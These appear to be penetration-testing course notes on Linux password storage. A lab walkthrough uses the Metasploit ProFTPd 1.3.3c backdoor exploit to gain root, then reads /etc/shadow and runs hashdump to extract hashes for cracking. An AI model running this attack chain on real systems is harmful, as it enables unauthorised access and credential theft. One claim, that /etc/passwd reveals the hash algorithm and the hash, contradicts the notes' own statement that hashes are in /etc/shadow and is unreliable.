Linux Password Hashes
- Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and a disadvantage from a security perspective. In that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.
- All of the user and service accounts information on Linux is stored in the `passwd` file located in: `/etc/passwd`
- We cannot view the passwords for the users in the `passwd` file because they are encrypted and stored in the `shadow` file, located at `/etc/shadow` file instead, which can only be read by the "root" user.
- The `passwd` file does not include any password information, and is readable by any user on the system.
- The `shadow` file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.

Linux Password Hashes
- The `passwd` file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used, and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($).

- The hashing algorithm used to hash Linux user passwords may differ by distributions, but generally modern Linux distributions use the strongest hashing algorithm yet, SHA512.
- The hash type can be used to determine if it is feasible to crack the password hash.

Practical Demonstration
- `ifconfig`
- `nmap -sV demo.ine.local -T4`
- The `nmap` scan informs us that the target machine is running a FTP server, with the version "ProFTPd 1.3.3c".
- `searchsploit ProFTPd`
- `service postgresql start && msfconsole`
- `setg RHOSTS demo.ine.local`
- `search ProFTPd`
- `use exploit/unix/ftp/proftpd_133c_backdoor`
	- `options`
	- `exploit`
		- `/bin/bash -i`
- Bash Shell
	- `id`
- `sessions`
- `sessions -u 1` can be used to upgrade the session to a Meterpreter session.
- `sessions`
- `sessions 2`
- Dumping Linux Password Hashes using a Meterpreter Session with root privileges, by reading the `/etc/shadow` file.
	- Meterpreter Shell
		- `sysinfo`
		- `getuid`
		- A uid of 0 denotes that the user is the root user for the target system.
		- `cat /etc/shadow`
		- The password hash in the `shadow` file starts with a `$6$` value, so we can determine that it is a SHA512 password hash.
- Dumping Linux Password Hashes using the Metasploit `hashdump` module.
	- `use post/linux/gather/hashdump`
		- `options`
		- `sessions`
		- `set SESSION 2`
		- `run`
	- The hashdump module returns an unshadowed password hash, which basically means that the hash value has been extracted and can be directly used for the cracking.
